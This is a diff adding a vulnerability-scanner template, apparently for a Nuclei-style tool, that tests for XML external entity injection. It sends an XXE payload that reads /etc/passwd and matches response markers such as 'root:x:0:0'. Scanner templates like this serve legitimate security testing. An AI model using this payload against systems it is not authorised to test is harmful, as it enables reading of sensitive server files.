@@ -1,0 +1,25 @@
+id: xxe5-0276
+name: 'XXE read in xml'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via xml'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      xml:
+        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
